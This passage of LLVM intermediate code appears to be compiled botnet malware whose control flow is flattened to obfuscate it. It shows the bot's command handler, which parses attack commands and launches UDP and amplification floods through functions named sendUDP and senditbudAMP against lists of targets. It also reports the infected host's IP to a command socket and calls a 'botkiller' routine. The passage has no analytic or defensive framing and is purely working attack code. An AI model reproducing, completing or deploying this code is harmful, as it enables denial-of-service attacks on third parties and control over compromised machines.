  %145 = call i32 @listFork()
  %146 = icmp ne i32 %145, 0
  %147 = select i1 %146, i32 962222481, i32 310348205
  store i32 %147, i32* %switchVar
  br label %loopEnd

; <label>:148:                                    ; preds = %loopEntry
  %149 = load i32, i32* @mainCommSock, align 4
  %150 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %151 = call i8* @inet_ntoa(i32 %150) #2
  %152 = call i32 (i32, i8*, ...) @sockprintf(i32 %149, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.526, i32 0, i32 0), i8* %151)
  call void @botkiller()
  call void @_exit(i32 0) #12
  unreachable

; <label>:153:                                    ; preds = %loopEntry
  store i32 -566057786, i32* %switchVar
  br label %loopEnd

; <label>:154:                                    ; preds = %loopEntry
  %155 = load i8**, i8*** %4, align 8
  %156 = getelementptr inbounds i8*, i8** %155, i64 0
  %157 = load i8*, i8** %156, align 8
  %158 = call i32 @strcmp(i8* %157, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.527, i32 0, i32 0)) #10
  %159 = icmp ne i32 %158, 0
  %160 = select i1 %159, i32 -817220988, i32 64593833
  store i32 %160, i32* %switchVar
  br label %loopEnd

; <label>:161:                                    ; preds = %loopEntry
  store i32 980613711, i32* %switchVar
  br label %loopEnd

; <label>:162:                                    ; preds = %loopEntry
  %163 = load i8**, i8*** %4, align 8
  %164 = getelementptr inbounds i8*, i8** %163, i64 0
  %165 = load i8*, i8** %164, align 8
  %166 = call i32 @strcmp(i8* %165, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.528, i32 0, i32 0)) #10
  %167 = icmp ne i32 %166, 0
  %168 = select i1 %167, i32 -1977080516, i32 1787156359
  store i32 %168, i32* %switchVar
  br label %loopEnd

; <label>:169:                                    ; preds = %loopEntry
  %170 = load i8**, i8*** %4, align 8
  %171 = getelementptr inbounds i8*, i8** %170, i64 1
  %172 = load i8*, i8** %171, align 8
  %173 = call i32 @strcmp(i8* %172, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.504, i32 0, i32 0)) #10
  %174 = icmp ne i32 %173, 0
  %175 = select i1 %174, i32 1499681875, i32 2101402777
  store i32 %175, i32* %switchVar
  br label %loopEnd

; <label>:176:                                    ; preds = %loopEntry
  %177 = load i32, i32* %3, align 4
  %178 = icmp ne i32 %177, 5
  %179 = select i1 %178, i32 1162605441, i32 1289302107
  store i32 %179, i32* %switchVar
  br label %loopEnd

; <label>:180:                                    ; preds = %loopEntry
  store i32 980613711, i32* %switchVar
  br label %loopEnd

; <label>:181:                                    ; preds = %loopEntry
  %182 = load i8**, i8*** %4, align 8
  %183 = getelementptr inbounds i8*, i8** %182, i64 2
  %184 = load i8*, i8** %183, align 8
  %185 = ptrtoint i8* %184 to i32
  store i32 %185, i32* %8, align 4
  %186 = load i8**, i8*** %4, align 8
  %187 = getelementptr inbounds i8*, i8** %186, i64 3
  %188 = load i8*, i8** %187, align 8
  %189 = ptrtoint i8* %188 to i32
  store i32 %189, i32* %9, align 4
  %190 = load i8**, i8*** %4, align 8
  %191 = getelementptr inbounds i8*, i8** %190, i64 4
  %192 = load i8*, i8** %191, align 8
  %193 = ptrtoint i8* %192 to i32
  store i32 %193, i32* %10, align 4
  %194 = load i32, i32* %8, align 4
  %195 = sext i32 %194 to i64
  %196 = inttoptr i64 %195 to i8*
  %197 = load i32, i32* %9, align 4
  %198 = sext i32 %197 to i64
  %199 = inttoptr i64 %198 to i8*
  %200 = load i32, i32* %10, align 4
  %201 = sext i32 %200 to i64
  %202 = inttoptr i64 %201 to i8*
  call void @senditbudAMP(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.504, i32 0, i32 0), i8* %196, i8* %199, i8* %202)
  store i32 1499681875, i32* %switchVar
  br label %loopEnd

; <label>:203:                                    ; preds = %loopEntry
  %204 = load i8**, i8*** %4, align 8
  %205 = getelementptr inbounds i8*, i8** %204, i64 1
  %206 = load i8*, i8** %205, align 8
  %207 = call i32 @strcmp(i8* %206, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.506, i32 0, i32 0)) #10
  %208 = icmp ne i32 %207, 0
  %209 = select i1 %208, i32 -149526696, i32 -1083715251
  store i32 %209, i32* %switchVar
  br label %loopEnd

; <label>:210:                                    ; preds = %loopEntry
  %211 = load i32, i32* %3, align 4
  %212 = icmp ne i32 %211, 5
  %213 = select i1 %212, i32 147429181, i32 572970616
  store i32 %213, i32* %switchVar
  br label %loopEnd

; <label>:214:                                    ; preds = %loopEntry
  store i32 980613711, i32* %switchVar
  br label %loopEnd

; <label>:215:                                    ; preds = %loopEntry
  %216 = load i8**, i8*** %4, align 8
  %217 = getelementptr inbounds i8*, i8** %216, i64 2
  %218 = load i8*, i8** %217, align 8
  %219 = ptrtoint i8* %218 to i32
  store i32 %219, i32* %11, align 4
  %220 = load i8**, i8*** %4, align 8
  %221 = getelementptr inbounds i8*, i8** %220, i64 3
  %222 = load i8*, i8** %221, align 8
  %223 = ptrtoint i8* %222 to i32
  store i32 %223, i32* %12, align 4
  %224 = load i8**, i8*** %4, align 8
  %225 = getelementptr inbounds i8*, i8** %224, i64 4
  %226 = load i8*, i8** %225, align 8
  %227 = ptrtoint i8* %226 to i32
  store i32 %227, i32* %13, align 4
  %228 = load i32, i32* %11, align 4
  %229 = sext i32 %228 to i64
  %230 = inttoptr i64 %229 to i8*
  %231 = load i32, i32* %12, align 4
  %232 = sext i32 %231 to i64
  %233 = inttoptr i64 %232 to i8*
  %234 = load i32, i32* %13, align 4
  %235 = sext i32 %234 to i64
  %236 = inttoptr i64 %235 to i8*
  call void @senditbudAMP(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.506, i32 0, i32 0), i8* %230, i8* %233, i8* %236)
  store i32 -149526696, i32* %switchVar
  br label %loopEnd

; <label>:237:                                    ; preds = %loopEntry
  %238 = load i8**, i8*** %4, align 8
  %239 = getelementptr inbounds i8*, i8** %238, i64 1
  %240 = load i8*, i8** %239, align 8
  %241 = call i32 @strcmp(i8* %240, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.508, i32 0, i32 0)) #10
  %242 = icmp ne i32 %241, 0
  %243 = select i1 %242, i32 -335820615, i32 182928911
  store i32 %243, i32* %switchVar
  br label %loopEnd

; <label>:244:                                    ; preds = %loopEntry
  %245 = load i32, i32* %3, align 4
  %246 = icmp ne i32 %245, 5
  %247 = select i1 %246, i32 1573254639, i32 507399379
  store i32 %247, i32* %switchVar
  br label %loopEnd

; <label>:248:                                    ; preds = %loopEntry
  store i32 980613711, i32* %switchVar
  br label %loopEnd

; <label>:249:                                    ; preds = %loopEntry
  %250 = load i8**, i8*** %4, align 8
  %251 = getelementptr inbounds i8*, i8** %250, i64 2
  %252 = load i8*, i8** %251, align 8
  %253 = ptrtoint i8* %252 to i32
  store i32 %253, i32* %14, align 4
  %254 = load i8**, i8*** %4, align 8
  %255 = getelementptr inbounds i8*, i8** %254, i64 3
  %256 = load i8*, i8** %255, align 8
  %257 = ptrtoint i8* %256 to i32
  store i32 %257, i32* %15, align 4
  %258 = load i8**, i8*** %4, align 8
  %259 = getelementptr inbounds i8*, i8** %258, i64 4
  %260 = load i8*, i8** %259, align 8
  %261 = ptrtoint i8* %260 to i32
  store i32 %261, i32* %16, align 4
  %262 = load i32, i32* %14, align 4
  %263 = sext i32 %262 to i64
  %264 = inttoptr i64 %263 to i8*
  %265 = load i32, i32* %15, align 4
  %266 = sext i32 %265 to i64
  %267 = inttoptr i64 %266 to i8*
  %268 = load i32, i32* %16, align 4
  %269 = sext i32 %268 to i64
  %270 = inttoptr i64 %269 to i8*
  call void @senditbudAMP(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.508, i32 0, i32 0), i8* %264, i8* %267, i8* %270)
  store i32 -335820615, i32* %switchVar
  br label %loopEnd

; <label>:271:                                    ; preds = %loopEntry
  %272 = load i8**, i8*** %4, align 8
  %273 = getelementptr inbounds i8*, i8** %272, i64 1
  %274 = load i8*, i8** %273, align 8
  %275 = call i32 @strcmp(i8* %274, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.510, i32 0, i32 0)) #10
  %276 = icmp ne i32 %275, 0
  %277 = select i1 %276, i32 322000241, i32 -231117671
  store i32 %277, i32* %switchVar
  br label %loopEnd

; <label>:278:                                    ; preds = %loopEntry
  %279 = load i32, i32* %3, align 4
  %280 = icmp ne i32 %279, 5
  %281 = select i1 %280, i32 -984877799, i32 -1350028215
  store i32 %281, i32* %switchVar
  br label %loopEnd

; <label>:282:                                    ; preds = %loopEntry
  store i32 980613711, i32* %switchVar
  br label %loopEnd

; <label>:283:                                    ; preds = %loopEntry
  %284 = load i8**, i8*** %4, align 8
  %285 = getelementptr inbounds i8*, i8** %284, i64 2
  %286 = load i8*, i8** %285, align 8
  %287 = ptrtoint i8* %286 to i32
  store i32 %287, i32* %17, align 4
  %288 = load i8**, i8*** %4, align 8
  %289 = getelementptr inbounds i8*, i8** %288, i64 3
  %290 = load i8*, i8** %289, align 8
  %291 = ptrtoint i8* %290 to i32
  store i32 %291, i32* %18, align 4
  %292 = load i8**, i8*** %4, align 8
  %293 = getelementptr inbounds i8*, i8** %292, i64 4
  %294 = load i8*, i8** %293, align 8
  %295 = ptrtoint i8* %294 to i32
  store i32 %295, i32* %19, align 4
  %296 = load i32, i32* %17, align 4
  %297 = sext i32 %296 to i64
  %298 = inttoptr i64 %297 to i8*
  %299 = load i32, i32* %18, align 4
  %300 = sext i32 %299 to i64
  %301 = inttoptr i64 %300 to i8*
  %302 = load i32, i32* %19, align 4
  %303 = sext i32 %302 to i64
  %304 = inttoptr i64 %303 to i8*
  call void @senditbudAMP(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.510, i32 0, i32 0), i8* %298, i8* %301, i8* %304)
  store i32 322000241, i32* %switchVar
  br label %loopEnd

; <label>:305:                                    ; preds = %loopEntry
  %306 = load i8**, i8*** %4, align 8
  %307 = getelementptr inbounds i8*, i8** %306, i64 1
  %308 = load i8*, i8** %307, align 8
  %309 = call i32 @strcmp(i8* %308, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.502, i32 0, i32 0)) #10
  %310 = icmp ne i32 %309, 0
  %311 = select i1 %310, i32 913882095, i32 864170672
  store i32 %311, i32* %switchVar
  br label %loopEnd

; <label>:312:                                    ; preds = %loopEntry
  %313 = load i32, i32* %3, align 4
  %314 = icmp ne i32 %313, 5
  %315 = select i1 %314, i32 -2066528545, i32 115988944
  store i32 %315, i32* %switchVar
  br label %loopEnd

; <label>:316:                                    ; preds = %loopEntry
  store i32 980613711, i32* %switchVar
  br label %loopEnd

; <label>:317:                                    ; preds = %loopEntry
  %318 = load i8**, i8*** %4, align 8
  %319 = getelementptr inbounds i8*, i8** %318, i64 2
  %320 = load i8*, i8** %319, align 8
  %321 = ptrtoint i8* %320 to i32
  store i32 %321, i32* %20, align 4
  %322 = load i8**, i8*** %4, align 8
  %323 = getelementptr inbounds i8*, i8** %322, i64 3
  %324 = load i8*, i8** %323, align 8
  %325 = ptrtoint i8* %324 to i32
  store i32 %325, i32* %21, align 4
  %326 = load i8**, i8*** %4, align 8
  %327 = getelementptr inbounds i8*, i8** %326, i64 4
  %328 = load i8*, i8** %327, align 8
  %329 = ptrtoint i8* %328 to i32
  store i32 %329, i32* %22, align 4
  %330 = load i32, i32* %20, align 4
  %331 = sext i32 %330 to i64
  %332 = inttoptr i64 %331 to i8*
  %333 = load i32, i32* %21, align 4
  %334 = sext i32 %333 to i64
  %335 = inttoptr i64 %334 to i8*
  %336 = load i32, i32* %22, align 4
  %337 = sext i32 %336 to i64
  %338 = inttoptr i64 %337 to i8*
  call void @senditbudAMP(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.502, i32 0, i32 0), i8* %332, i8* %335, i8* %338)
  store i32 913882095, i32* %switchVar
  br label %loopEnd

; <label>:339:                                    ; preds = %loopEntry
  %340 = load i8**, i8*** %4, align 8
  %341 = getelementptr inbounds i8*, i8** %340, i64 1
  %342 = load i8*, i8** %341, align 8
  %343 = call i32 @strcmp(i8* %342, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.512, i32 0, i32 0)) #10
  %344 = icmp ne i32 %343, 0
  %345 = select i1 %344, i32 -175878709, i32 1726999039
  store i32 %345, i32* %switchVar
  br label %loopEnd

; <label>:346:                                    ; preds = %loopEntry
  %347 = load i32, i32* %3, align 4
  %348 = icmp ne i32 %347, 5
  %349 = select i1 %348, i32 -1349190725, i32 1909924288
  store i32 %349, i32* %switchVar
  br label %loopEnd

; <label>:350:                                    ; preds = %loopEntry
  store i32 980613711, i32* %switchVar
  br label %loopEnd

; <label>:351:                                    ; preds = %loopEntry
  %352 = load i8**, i8*** %4, align 8
  %353 = getelementptr inbounds i8*, i8** %352, i64 2
  %354 = load i8*, i8** %353, align 8
  %355 = ptrtoint i8* %354 to i32
  store i32 %355, i32* %23, align 4
  %356 = load i8**, i8*** %4, align 8
  %357 = getelementptr inbounds i8*, i8** %356, i64 3
  %358 = load i8*, i8** %357, align 8
  %359 = ptrtoint i8* %358 to i32
  store i32 %359, i32* %24, align 4
  %360 = load i8**, i8*** %4, align 8
  %361 = getelementptr inbounds i8*, i8** %360, i64 4
  %362 = load i8*, i8** %361, align 8
  %363 = ptrtoint i8* %362 to i32
  store i32 %363, i32* %25, align 4
  %364 = load i32, i32* %23, align 4
  %365 = sext i32 %364 to i64
  %366 = inttoptr i64 %365 to i8*
  %367 = load i32, i32* %24, align 4
  %368 = sext i32 %367 to i64
  %369 = inttoptr i64 %368 to i8*
  %370 = load i32, i32* %25, align 4
  %371 = sext i32 %370 to i64
  %372 = inttoptr i64 %371 to i8*
  call void @senditbudAMP(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.512, i32 0, i32 0), i8* %366, i8* %369, i8* %372)
  store i32 -175878709, i32* %switchVar
  br label %loopEnd

; <label>:373:                                    ; preds = %loopEntry
  %374 = load i8**, i8*** %4, align 8
  %375 = getelementptr inbounds i8*, i8** %374, i64 1
  %376 = load i8*, i8** %375, align 8
  %377 = call i32 @strcmp(i8* %376, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.514, i32 0, i32 0)) #10
  %378 = icmp ne i32 %377, 0
  %379 = select i1 %378, i32 -268563312, i32 1692785483
  store i32 %379, i32* %switchVar
  br label %loopEnd

; <label>:380:                                    ; preds = %loopEntry
  %381 = load i32, i32* %3, align 4
  %382 = icmp ne i32 %381, 5
  %383 = select i1 %382, i32 1533222823, i32 -1174493030
  store i32 %383, i32* %switchVar
  br label %loopEnd

; <label>:384:                                    ; preds = %loopEntry
  store i32 980613711, i32* %switchVar
  br label %loopEnd

; <label>:385:                                    ; preds = %loopEntry
  %386 = load i8**, i8*** %4, align 8
  %387 = getelementptr inbounds i8*, i8** %386, i64 2
  %388 = load i8*, i8** %387, align 8
  %389 = ptrtoint i8* %388 to i32
  store i32 %389, i32* %26, align 4
  %390 = load i8**, i8*** %4, align 8
  %391 = getelementptr inbounds i8*, i8** %390, i64 3
  %392 = load i8*, i8** %391, align 8
  %393 = ptrtoint i8* %392 to i32
  store i32 %393, i32* %27, align 4
  %394 = load i8**, i8*** %4, align 8
  %395 = getelementptr inbounds i8*, i8** %394, i64 4
  %396 = load i8*, i8** %395, align 8
  %397 = ptrtoint i8* %396 to i32
  store i32 %397, i32* %28, align 4
  %398 = load i32, i32* %26, align 4
  %399 = sext i32 %398 to i64
  %400 = inttoptr i64 %399 to i8*
  %401 = load i32, i32* %27, align 4
  %402 = sext i32 %401 to i64
  %403 = inttoptr i64 %402 to i8*
  %404 = load i32, i32* %28, align 4
  %405 = sext i32 %404 to i64
  %406 = inttoptr i64 %405 to i8*
  call void @senditbudAMP(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.514, i32 0, i32 0), i8* %400, i8* %403, i8* %406)
  store i32 -268563312, i32* %switchVar
  br label %loopEnd

; <label>:407:                                    ; preds = %loopEntry
  store i32 -1977080516, i32* %switchVar
  br label %loopEnd

; <label>:408:                                    ; preds = %loopEntry
  %409 = load i8**, i8*** %4, align 8
  %410 = getelementptr inbounds i8*, i8** %409, i64 0
  %411 = load i8*, i8** %410, align 8
  %412 = call i32 @strcmp(i8* %411, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.529, i32 0, i32 0)) #10
  %413 = icmp ne i32 %412, 0
  %414 = select i1 %413, i32 -2118156089, i32 -1988791435
  store i32 %414, i32* %switchVar
  br label %loopEnd

; <label>:415:                                    ; preds = %loopEntry
  %416 = load i32, i32* %3, align 4
  %417 = icmp slt i32 %416, 6
  %418 = select i1 %417, i32 -508155300, i32 -2057446108
  store i32 %418, i32* %switchVar
  br label %loopEnd

; <label>:419:                                    ; preds = %loopEntry
  %420 = load i8**, i8*** %4, align 8
  %421 = getelementptr inbounds i8*, i8** %420, i64 3
  %422 = load i8*, i8** %421, align 8
  %423 = call i32 @atoi(i8* %422) #10
  %424 = icmp eq i32 %423, -1
  %425 = select i1 %424, i32 -508155300, i32 -78627862
  store i32 %425, i32* %switchVar
  br label %loopEnd

; <label>:426:                                    ; preds = %loopEntry
  %427 = load i8**, i8*** %4, align 8
  %428 = getelementptr inbounds i8*, i8** %427, i64 2
  %429 = load i8*, i8** %428, align 8
  %430 = call i32 @atoi(i8* %429) #10
  %431 = icmp eq i32 %430, -1
  %432 = select i1 %431, i32 -508155300, i32 -1461635036
  store i32 %432, i32* %switchVar
  br label %loopEnd

; <label>:433:                                    ; preds = %loopEntry
  %434 = load i8**, i8*** %4, align 8
  %435 = getelementptr inbounds i8*, i8** %434, i64 4
  %436 = load i8*, i8** %435, align 8
  %437 = call i32 @atoi(i8* %436) #10
  %438 = icmp eq i32 %437, -1
  %439 = select i1 %438, i32 -508155300, i32 -1730755760
  store i32 %439, i32* %switchVar
  br label %loopEnd

; <label>:440:                                    ; preds = %loopEntry
  %441 = load i8**, i8*** %4, align 8
  %442 = getelementptr inbounds i8*, i8** %441, i64 5
  %443 = load i8*, i8** %442, align 8
  %444 = call i32 @atoi(i8* %443) #10
  %445 = icmp eq i32 %444, -1
  %446 = select i1 %445, i32 -508155300, i32 -1910010762
  store i32 %446, i32* %switchVar
  br label %loopEnd

; <label>:447:                                    ; preds = %loopEntry
  %448 = load i8**, i8*** %4, align 8
  %449 = getelementptr inbounds i8*, i8** %448, i64 5
  %450 = load i8*, i8** %449, align 8
  %451 = call i32 @atoi(i8* %450) #10
  %452 = icmp sgt i32 %451, 65536
  %453 = select i1 %452, i32 -508155300, i32 -1196989918
  store i32 %453, i32* %switchVar
  br label %loopEnd

; <label>:454:                                    ; preds = %loopEntry
  %455 = load i8**, i8*** %4, align 8
  %456 = getelementptr inbounds i8*, i8** %455, i64 5
  %457 = load i8*, i8** %456, align 8
  %458 = call i32 @atoi(i8* %457) #10
  %459 = icmp sgt i32 %458, 65500
  %460 = select i1 %459, i32 -508155300, i32 112515966
  store i32 %460, i32* %switchVar
  br label %loopEnd

; <label>:461:                                    ; preds = %loopEntry
  %462 = load i8**, i8*** %4, align 8
  %463 = getelementptr inbounds i8*, i8** %462, i64 4
  %464 = load i8*, i8** %463, align 8
  %465 = call i32 @atoi(i8* %464) #10
  %466 = icmp sgt i32 %465, 32
  %467 = select i1 %466, i32 -508155300, i32 924486306
  store i32 %467, i32* %switchVar
  br label %loopEnd

; <label>:468:                                    ; preds = %loopEntry
  %469 = load i32, i32* %3, align 4
  %470 = icmp eq i32 %469, 7
  %471 = select i1 %470, i32 -1210776666, i32 -146265339
  store i32 %471, i32* %switchVar
  br label %loopEnd

; <label>:472:                                    ; preds = %loopEntry
  %473 = load i8**, i8*** %4, align 8
  %474 = getelementptr inbounds i8*, i8** %473, i64 6
  %475 = load i8*, i8** %474, align 8
  %476 = call i32 @atoi(i8* %475) #10
  %477 = icmp slt i32 %476, 1
  %478 = select i1 %477, i32 -508155300, i32 -146265339
  store i32 %478, i32* %switchVar
  br label %loopEnd

; <label>:479:                                    ; preds = %loopEntry
  store i32 980613711, i32* %switchVar
  br label %loopEnd

; <label>:480:                                    ; preds = %loopEntry
  %481 = load i8**, i8*** %4, align 8
  %482 = getelementptr inbounds i8*, i8** %481, i64 1
  %483 = load i8*, i8** %482, align 8
  store i8* %483, i8** %29, align 8
  %484 = load i8**, i8*** %4, align 8
  %485 = getelementptr inbounds i8*, i8** %484, i64 2
  %486 = load i8*, i8** %485, align 8
  %487 = call i32 @atoi(i8* %486) #10
  store i32 %487, i32* %30, align 4
  %488 = load i8**, i8*** %4, align 8
  %489 = getelementptr inbounds i8*, i8** %488, i64 3
  %490 = load i8*, i8** %489, align 8
  %491 = call i32 @atoi(i8* %490) #10
  store i32 %491, i32* %31, align 4
  %492 = load i8**, i8*** %4, align 8
  %493 = getelementptr inbounds i8*, i8** %492, i64 4
  %494 = load i8*, i8** %493, align 8
  %495 = call i32 @atoi(i8* %494) #10
  store i32 %495, i32* %32, align 4
  %496 = load i8**, i8*** %4, align 8
  %497 = getelementptr inbounds i8*, i8** %496, i64 5
  %498 = load i8*, i8** %497, align 8
  %499 = call i32 @atoi(i8* %498) #10
  store i32 %499, i32* %33, align 4
  %500 = load i32, i32* %3, align 4
  %501 = icmp sgt i32 %500, 6
  %502 = select i1 %501, i32 -15953523, i32 24004979
  store i32 %502, i32* %switchVar
  br label %loopEnd

; <label>:503:                                    ; preds = %loopEntry
  %504 = load i8**, i8*** %4, align 8
  %505 = getelementptr inbounds i8*, i8** %504, i64 6
  %506 = load i8*, i8** %505, align 8
  %507 = call i32 @atoi(i8* %506) #10
  store i32 1051509545, i32* %switchVar
  store i32 %507, i32* %.reg2mem2
  br label %loopEnd

; <label>:508:                                    ; preds = %loopEntry
  store i32 1051509545, i32* %switchVar
  store i32 1000, i32* %.reg2mem2
  br label %loopEnd

; <label>:509:                                    ; preds = %loopEntry
  %.reload3 = load i32, i32* %.reg2mem2
  store i32 %.reload3, i32* %34, align 4
  %510 = load i32, i32* %3, align 4
  %511 = icmp sgt i32 %510, 7
  %512 = select i1 %511, i32 279050986, i32 639193375
  store i32 %512, i32* %switchVar
  br label %loopEnd

; <label>:513:                                    ; preds = %loopEntry
  %514 = load i8**, i8*** %4, align 8
  %515 = getelementptr inbounds i8*, i8** %514, i64 7
  %516 = load i8*, i8** %515, align 8
  %517 = call i32 @atoi(i8* %516) #10
  store i32 2036534373, i32* %switchVar
  store i32 %517, i32* %.reg2mem4
  br label %loopEnd

; <label>:518:                                    ; preds = %loopEntry
  store i32 2036534373, i32* %switchVar
  store i32 1000000, i32* %.reg2mem4
  br label %loopEnd

; <label>:519:                                    ; preds = %loopEntry
  %.reload5 = load i32, i32* %.reg2mem4
  store i32 %.reload5, i32* %35, align 4
  %520 = load i32, i32* %3, align 4
  %521 = icmp sgt i32 %520, 8
  %522 = select i1 %521, i32 869896831, i32 239638838
  store i32 %522, i32* %switchVar
  br label %loopEnd

; <label>:523:                                    ; preds = %loopEntry
  %524 = load i8**, i8*** %4, align 8
  %525 = getelementptr inbounds i8*, i8** %524, i64 8
  %526 = load i8*, i8** %525, align 8
  %527 = call i32 @atoi(i8* %526) #10
  store i32 1753532434, i32* %switchVar
  store i32 %527, i32* %.reg2mem6
  br label %loopEnd

; <label>:528:                                    ; preds = %loopEntry
  store i32 1753532434, i32* %switchVar
  store i32 0, i32* %.reg2mem6
  br label %loopEnd

; <label>:529:                                    ; preds = %loopEntry
  %.reload7 = load i32, i32* %.reg2mem6
  store i32 %.reload7, i32* %36, align 4
  %530 = load i8*, i8** %29, align 8
  %531 = call i8* @strstr(i8* %530, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.183, i32 0, i32 0)) #10
  %532 = icmp ne i8* %531, null
  %533 = select i1 %532, i32 -1986797399, i32 -458985734
  store i32 %533, i32* %switchVar
  br label %loopEnd

; <label>:534:                                    ; preds = %loopEntry
  %535 = load i8*, i8** %29, align 8
  %536 = call i8* @strtok(i8* %535, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.183, i32 0, i32 0)) #2
  store i8* %536, i8** %37, align 8
  store i32 -1393794854, i32* %switchVar
  br label %loopEnd

; <label>:537:                                    ; preds = %loopEntry
  %538 = load i8*, i8** %37, align 8
  %539 = icmp ne i8* %538, null
  %540 = select i1 %539, i32 152896909, i32 -1608436969
  store i32 %540, i32* %switchVar
  br label %loopEnd

; <label>:541:                                    ; preds = %loopEntry
  %542 = call i32 @listFork()
  %543 = icmp ne i32 %542, 0
  %544 = select i1 %543, i32 -371639868, i32 1798537138
  store i32 %544, i32* %switchVar
  br label %loopEnd

; <label>:545:                                    ; preds = %loopEntry
  %546 = load i8*, i8** %37, align 8
  %547 = load i32, i32* %30, align 4
  %548 = load i32, i32* %31, align 4
  %549 = load i32, i32* %32, align 4
  %550 = load i32, i32* %33, align 4
  %551 = load i32, i32* %34, align 4
  %552 = load i32, i32* %35, align 4
  %553 = load i32, i32* %36, align 4
  call void @sendUDP(i8* %546, i32 %547, i32 %548, i32 %549, i32 %550, i32 %551, i32 %552, i32 %553)
  call void @_exit(i32 0) #12
  unreachable

; <label>:554:                                    ; preds = %loopEntry
  %555 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.183, i32 0, i32 0)) #2
  store i8* %555, i8** %37, align 8
  store i32 -1393794854, i32* %switchVar
  br label %loopEnd

; <label>:556:                                    ; preds = %loopEntry
  store i32 -366073180, i32* %switchVar
  br label %loopEnd

; <label>:557:                                    ; preds = %loopEntry
  %558 = call i32 @listFork()
  %559 = icmp ne i32 %558, 0
  %560 = select i1 %559, i32 -172217930, i32 509477234
  store i32 %560, i32* %switchVar
  br label %loopEnd

; <label>:561:                                    ; preds = %loopEntry
  %562 = load i8*, i8** %29, align 8
  %563 = load i32, i32* %30, align 4
  %564 = load i32, i32* %31, align 4
  %565 = load i32, i32* %32, align 4
  %566 = load i32, i32* %33, align 4
  %567 = load i32, i32* %34, align 4
  %568 = load i32, i32* %35, align 4
  %569 = load i32, i32* %36, align 4
  call void @sendUDP(i8* %562, i32 %563, i32 %564, i32 %565, i32 %566, i32 %567, i32 %568, i32 %569)
  call void @_exit(i32 0) #12
  unreachable

; <label>:570:                                    ; preds = %loopEntry
  store i32 -366073180, i32* %switchVar
  br label %loopEnd

; <label>:571:                                    ; preds = %loopEntry
  store i32 980613711, i32* %switchVar
  br label %loopEnd

; <label>:572:                                    ; preds = %loopEntry
  %573 = load i8**, i8*** %4, align 8
  %574 = getelementptr inbounds i8*, i8** %573, i64 0
  %575 = load i8*, i8** %574, align 8
  %576 = call i32 @strcmp(i8* %575, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.530, i32 0, i32 0)) #10
  %577 = icmp ne i32 %576, 0
  %578 = select i1 %577, i32 1028203205, i32 219694933
  store i32 %578, i32* %switchVar
  br label %loopEnd

; <label>:579:                                    ; preds = %loopEntry
  %580 = load i32, i32* %3, align 4
  %581 = icmp slt i32 %580, 6
  %582 = select i1 %581, i32 1657604929, i32 -972076140
  store i32 %582, i32* %switchVar
  br label %loopEnd

; <label>:583:                                    ; preds = %loopEntry
  %584 = load i8**, i8*** %4, align 8
  %585 = getelementptr inbounds i8*, i8** %584, i64 3
  %586 = load i8*, i8** %585, align 8
  %587 = call i32 @atoi(i8* %586) #10
  %588 = icmp eq i32 %587, -1
  %589 = select i1 %588, i32 1657604929, i32 -29496274
  store i32 %589, i32* %switchVar
  br label %loopEnd

; <label>:590:                                    ; preds = %loopEntry
  %591 = load i8**, i8*** %4, align 8
  %592 = getelementptr inbounds i8*, i8** %591, i64 2
  %593 = load i8*, i8** %592, align 8
  %594 = call i32 @atoi(i8* %593) #10
  %595 = icmp eq i32 %594, -1
  %596 = select i1 %595, i32 1657604929, i32 1635548201
  store i32 %596, i32* %switchVar
  br label %loopEnd

; <label>:597:                                    ; preds = %loopEntry
  %598 = load i8**, i8*** %4, align 8
  %599 = getelementptr inbounds i8*, i8** %598, i64 4
  %600 = load i8*, i8** %599, align 8
  %601 = call i32 @atoi(i8* %600) #10
  %602 = icmp eq i32 %601, -1
  %603 = select i1 %602, i32 1657604929, i32 1025537899
  store i32 %603, i32* %switchVar
  br label %loopEnd

; <label>:604:                                    ; preds = %loopEntry
  %605 = load i8**, i8*** %4, align 8
  %606 = getelementptr inbounds i8*, i8** %605, i64 4
  %607 = load i8*, i8** %606, align 8
  %608 = call i32 @atoi(i8* %607) #10
  %609 = icmp sgt i32 %608, 32
  %610 = select i1 %609, i32 1657604929, i32 -444097885
  store i32 %610, i32* %switchVar
  br label %loopEnd

; <label>:611:                                    ; preds = %loopEntry
  %612 = load i32, i32* %3, align 4
  %613 = icmp sgt i32 %612, 6
  %614 = select i1 %613, i32 1624044311, i32 385830592
  store i32 %614, i32* %switchVar
  br label %loopEnd

; <label>:615:                                    ; preds = %loopEntry
  %616 = load i8**, i8*** %4, align 8
  %617 = getelementptr inbounds i8*, i8** %616, i64 6
  %618 = load i8*, i8** %617, align 8
  %619 = call i32 @atoi(i8* %618) #10
  %620 = icmp slt i32 %619, 0
  %621 = select i1 %620, i32 1657604929, i32 385830592
  store i32 %621, i32* %switchVar
  br label %loopEnd

; <label>:622:                                    ; preds = %loopEntry
  %623 = load i32, i32* %3, align 4
  %624 = icmp eq i32 %623, 8
  %625 = select i1 %624, i32 -1188526612, i32 1612263320
  store i32 %625, i32* %switchVar
  br label %loopEnd

; <label>:626:                                    ; preds = %loopEntry
  %627 = load i8**, i8*** %4, align 8
  %628 = getelementptr inbounds i8*, i8** %627, i64 7
  %629 = load i8*, i8** %628, align 8
  %630 = call i32 @atoi(i8* %629) #10
